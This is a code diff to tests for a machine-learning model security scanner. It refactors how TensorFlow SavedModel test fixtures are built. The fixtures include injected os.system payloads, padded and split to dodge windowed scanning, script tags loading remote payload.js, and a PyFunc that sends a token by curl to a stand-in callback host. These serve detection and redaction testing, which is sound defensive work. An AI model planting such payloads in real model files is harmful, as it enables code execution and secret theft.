@@ -15,6 +15,7 @@ from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
 from modelaudit.utils.file.detection import PROTO0_1_MAX_PROBE_BYTES
 from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as has_tf_protos
+from tests.cache_lifecycle import IsolatedCacheManager
 from tests.helpers.assertions import _assert_absent
 from tests.helpers.file_creators import EvalPayload, SystemCommandPayload
 from tests.helpers.file_creators import protobuf_bytes_field as _protobuf_bytes_field
@@ -930,16 +931,12 @@ def test_protobuf_string_injection_detected_in_function_definition(tmp_path: Pat
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
 def test_padded_protobuf_string_injection_past_length_threshold_is_detected(tmp_path: Path) -> None:
     payload = "A" * 12_000 + "os.system('/bin/echo padded exploit')"
-    model_path = _create_test_savedmodel_with_scoped_nodes(
+    model_path = _create_test_savedmodel_with_string_attrs(
         tmp_path,
-        graph_nodes=[
-            {
-                "op": "Const",
-                "name": "padded_payload_node",
-                "string_attrs": {"payload": payload},
-            }
-        ],
-        model_name="padded_string_injection",
+        "Const",
+        "padded_payload_node",
+        {"payload": payload},
+        "padded_string_injection",
     )
 
     result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
@@ -988,16 +985,12 @@ def test_padded_protobuf_string_list_injection_is_detected(tmp_path: Path) -> No
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
 def test_benign_long_protobuf_string_is_scanned_without_security_finding(tmp_path: Path) -> None:
     benign_value = "safe-metadata-" + ("A" * 12_000)
-    model_path = _create_test_savedmodel_with_scoped_nodes(
+    model_path = _create_test_savedmodel_with_string_attrs(
         tmp_path,
-        graph_nodes=[
-            {
-                "op": "Const",
-                "name": "benign_long_node",
-                "string_attrs": {"description": benign_value},
-            }
-        ],
-        model_name="benign_long_string",
+        "Const",
+        "benign_long_node",
+        {"description": benign_value},
+        "benign_long_string",
     )
 
     result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
@@ -1017,16 +1010,12 @@ def test_benign_long_protobuf_string_is_scanned_without_security_finding(tmp_pat
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
 def test_fully_covered_windowed_protobuf_string_preserves_success(tmp_path: Path) -> None:
     benign_value = "safe-metadata-" + ("A" * 33_000)
-    model_path = _create_test_savedmodel_with_scoped_nodes(
+    model_path = _create_test_savedmodel_with_string_attrs(
         tmp_path,
-        graph_nodes=[
-            {
-                "op": "Const",
-                "name": "fully_covered_windowed_node",
-                "string_attrs": {"description": benign_value},
-            }
-        ],
-        model_name="fully_covered_windowed_string",
+        "Const",
+        "fully_covered_windowed_node",
+        {"description": benign_value},
+        "fully_covered_windowed_string",
     )
 
     result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
@@ -1045,16 +1034,12 @@ def test_fully_covered_windowed_protobuf_string_detects_boundary_split_injection
     split_offset = 32_768
     split_prefix = "os.syst"
     payload = ("A" * (split_offset - len(split_prefix)) + "os.system('/bin/echo split exploit')").ljust(49_152, "A")
-    model_path = _create_test_savedmodel_with_scoped_nodes(
+    model_path = _create_test_savedmodel_with_string_attrs(
         tmp_path,
-        graph_nodes=[
-            {
-                "op": "Const",
-                "name": "boundary_split_payload_node",
-                "string_attrs": {"payload": payload},
-            }
-        ],
-        model_name="boundary_split_windowed_string",
+        "Const",
+        "boundary_split_payload_node",
+        {"payload": payload},
+        "boundary_split_windowed_string",
     )
 
     result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
@@ -1074,16 +1059,12 @@ def test_fully_covered_windowed_protobuf_string_detects_boundary_split_injection
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
 def test_partial_window_match_does_not_hide_incomplete_protobuf_string_scan(tmp_path: Path) -> None:
     oversized_value = "../" + ("A" * 99_997) + "os.system('/bin/echo hidden exploit')" + ("A" * 200_000)
-    model_path = _create_test_savedmodel_with_scoped_nodes(
+    model_path = _create_test_savedmodel_with_string_attrs(
         tmp_path,
-        graph_nodes=[
-            {
-                "op": "Const",
-                "name": "partial_window_match_node",
-                "string_attrs": {"payload": oversized_value},
-            }
-        ],
-        model_name="partial_window_match_string",
+        "Const",
+        "partial_window_match_node",
+        {"payload": oversized_value},
+        "partial_window_match_string",
     )
 
     result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
@@ -1109,21 +1090,16 @@ def test_partial_window_match_does_not_hide_incomplete_protobuf_string_scan(tmp_
 def test_oversized_protobuf_string_without_full_coverage_fails_closed(tmp_path: Path) -> None:
     oversized_value = "safe-metadata-" + ("A" * 300_000)
     cache_dir = tmp_path / "cache"
-    model_path = _create_test_savedmodel_with_scoped_nodes(
+    model_path = _create_test_savedmodel_with_string_attrs(
         tmp_path,
-        graph_nodes=[
-            {
-                "op": "Const",
-                "name": "oversized_benign_node",
-                "string_attrs": {"description": oversized_value},
-            }
-        ],
-        model_name="oversized_long_string",
+        "Const",
+        "oversized_benign_node",
+        {"description": oversized_value},
+        "oversized_long_string",
     )
 
     result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
-    reset_cache_manager()
-    try:
+    with IsolatedCacheManager(lambda: reset_cache_manager()):
         aggregates = [
             scan_model_directory_or_file(
                 model_path,
@@ -1136,8 +1112,6 @@ def test_oversized_protobuf_string_without_full_coverage_fails_closed(tmp_path: 
 
         assert all(determine_exit_code(aggregate) == 2 for aggregate in aggregates)
         assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
-    finally:
-        reset_cache_manager()
 
     assert result.success is False
     assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
@@ -1289,8 +1263,7 @@ def test_savedmodel_graph_node_budget_marks_scan_inconclusive(
     assert budget_checks[0].details["analysis_incomplete"] is True
     assert determine_exit_code(aggregate) == 2
 
-    reset_cache_manager()
-    try:
+    with IsolatedCacheManager(lambda: reset_cache_manager()):
         cached_aggregates = [
             scan_model_directory_or_file(
                 str(model_path),
@@ -1302,8 +1275,6 @@ def test_savedmodel_graph_node_budget_marks_scan_inconclusive(
         ]
         assert all(determine_exit_code(cached_aggregate) == 2 for cached_aggregate in cached_aggregates)
         assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
-    finally:
-        reset_cache_manager()
 
 
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
@@ -1550,18 +1521,12 @@ def test_protobuf_string_injection_detected_in_list_attribute(tmp_path: Path) ->
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
 def test_savedmodel_protobuf_string_details_redact_model_controlled_values(tmp_path: Path) -> None:
     raw_secret = "sk-proj-CAND061SAVEDDETAILSECRET000000000"
-    model_path = _create_test_savedmodel_with_scoped_nodes(
+    model_path = _create_test_savedmodel_with_string_attrs(
         tmp_path,
-        graph_nodes=[
-            {
-                "op": "Const",
-                "name": f"node_{raw_secret}",
-                "string_attrs": {
-                    f"payload_{raw_secret}": (f'<script src="https://cdn.example/{raw_secret}/payload.js"></script>')
-                },
-            }
-        ],
-        model_name="protobuf_detail_secret",
+        "Const",
+        f"node_{raw_secret}",
+        {f"payload_{raw_secret}": (f'<script src="https://cdn.example/{raw_secret}/payload.js"></script>')},
+        "protobuf_detail_secret",
     )
 
     result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
@@ -1662,18 +1627,14 @@ def test_savedmodel_metadata_extraction_failure_redacts_exception(
 
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
 def test_savedmodel_protobuf_string_details_preserve_public_context(tmp_path: Path) -> None:
-    model_path = _create_test_savedmodel_with_scoped_nodes(
+    model_path = _create_test_savedmodel_with_string_attrs(
         tmp_path,
-        graph_nodes=[
-            {
-                "op": "Const",
-                "name": "public_script_node",
-                "string_attrs": {
-                    "html_snippet": '<script src="https://cdn.example/public/payload.js"></script>',
-                },
-            }
-        ],
-        model_name="protobuf_detail_public",
+        "Const",
+        "public_script_node",
+        {
+            "html_snippet": '<script src="https://cdn.example/public/payload.js"></script>',
+        },
+        "protobuf_detail_public",
     )
 
     result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
@@ -1796,16 +1757,12 @@ def test_tf_savedmodel_blacklist_scan_is_bounded_and_fail_closed(
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
 def test_tf_savedmodel_pyfunc_reference_uses_token_boundaries(tmp_path: Path) -> None:
     """Benign function references containing suspicious substrings should not be mislabeled."""
-    model_path = _create_test_savedmodel_with_scoped_nodes(
+    model_path = _create_test_savedmodel_with_string_attrs(
         tmp_path,
-        graph_nodes=[
-            {
-                "op": "PyFunc",
-                "name": "pyfunc_node",
-                "string_attrs": {"function_name": "custom_package.systematic_math"},
-            }
-        ],
-        model_name="benign_pyfunc_reference",
+        "PyFunc",
+        "pyfunc_node",
+        {"function_name": "custom_package.systematic_math"},
+        "benign_pyfunc_reference",
     )
 
     result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
@@ -1824,16 +1781,12 @@ def test_tf_savedmodel_pyfunc_reference_uses_token_boundaries(tmp_path: Path) ->
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
 def test_tf_savedmodel_pyfunc_reference_flags_direct_dangerous_refs(tmp_path: Path) -> None:
     """Direct dangerous function references should still be detected after token-boundary narrowing."""
-    model_path = _create_test_savedmodel_with_scoped_nodes(
+    model_path = _create_test_savedmodel_with_string_attrs(
         tmp_path,
-        graph_nodes=[
-            {
-                "op": "PyFunc",
-                "name": "pyfunc_node",
-                "string_attrs": {"function_name": "os.system"},
-            }
-        ],
-        model_name="malicious_pyfunc_reference",
+        "PyFunc",
+        "pyfunc_node",
+        {"function_name": "os.system"},
+        "malicious_pyfunc_reference",
     )
 
     result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
@@ -2156,16 +2109,12 @@ def test_pyfunc_code_preview_redacts_sensitive_values(tmp_path: Path) -> None:
     python_code = (
         f'import os\napi_key = "{raw_secret}"\nos.system("curl https://callback.example/hook?token={raw_secret}")\n'
     )
-    model_path = _create_test_savedmodel_with_scoped_nodes(
+    model_path = _create_test_savedmodel_with_string_attrs(
         tmp_path,
-        graph_nodes=[
-            {
-                "op": "PyFunc",
-                "name": "pyfunc_with_secret_code",
-                "string_attrs": {"func": python_code},
-            }
-        ],
-        model_name="pyfunc_preview_secret",
+        "PyFunc",
+        "pyfunc_with_secret_code",
+        {"func": python_code},
+        "pyfunc_preview_secret",
     )
 
     result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
@@ -2195,16 +2144,12 @@ def test_pyfunc_code_preview_redacts_container_secret_values(tmp_path: Path) -> 
         f'os.environ["API_KEY"] = "{raw_secrets[1]}"\n'
         f'headers = {{"Authorization": "{raw_secrets[2]}", "client_secret": "{raw_secrets[3]}"}}\n'
     )
-    model_path = _create_test_savedmodel_with_scoped_nodes(
+    model_path = _create_test_savedmodel_with_string_attrs(
         tmp_path,
-        graph_nodes=[
-            {
-                "op": "PyFunc",
-                "name": "pyfunc_with_structured_secret_code",
-                "string_attrs": {"func": python_code},
-            }
-        ],
-        model_name="pyfunc_structured_preview_secret",
+        "PyFunc",
+        "pyfunc_with_structured_secret_code",
+        {"func": python_code},
+        "pyfunc_structured_preview_secret",
     )
 
     result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
@@ -2223,16 +2168,12 @@ def test_pyfunc_code_preview_redacts_container_secret_values(tmp_path: Path) -> 
 def test_pyfunc_invalid_data_preview_redacts_sensitive_values(tmp_path: Path) -> None:
     raw_secret = "c081-pyfunc-invalid-secret-000000"
     python_data = f'api_key = "{raw_secret}"\nif True print("broken")\n'
-    model_path = _create_test_savedmodel_with_scoped_nodes(
+    model_path = _create_test_savedmodel_with_string_attrs(
         tmp_path,
-        graph_nodes=[
-            {
-                "op": "PyFunc",
-                "name": "pyfunc_with_secret_data",
-                "string_attrs": {"func": python_data},
-            }
-        ],
-        model_name="pyfunc_data_preview_secret",
+        "PyFunc",
+        "pyfunc_with_secret_data",
+        {"func": python_data},
+        "pyfunc_data_preview_secret",
     )
 
     result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
@@ -3089,6 +3030,21 @@ def _create_test_savedmodel_with_scoped_nodes(
     variables_dir.mkdir()
 
     return str(model_dir)
+
+
+def _create_test_savedmodel_with_string_attrs(
+    tmp_path: Path,
+    op: str,
+    node_name: str,
+    string_attrs: dict[str, str],
+    model_name: str,
+) -> str:
+    """Create one named SavedModel node with scalar string attributes."""
+    return _create_test_savedmodel_with_scoped_nodes(
+        tmp_path,
+        graph_nodes=[{"op": op, "name": node_name, "string_attrs": string_attrs}],
+        model_name=model_name,
+    )
 
 
 def _create_test_savedmodel_with_ops(
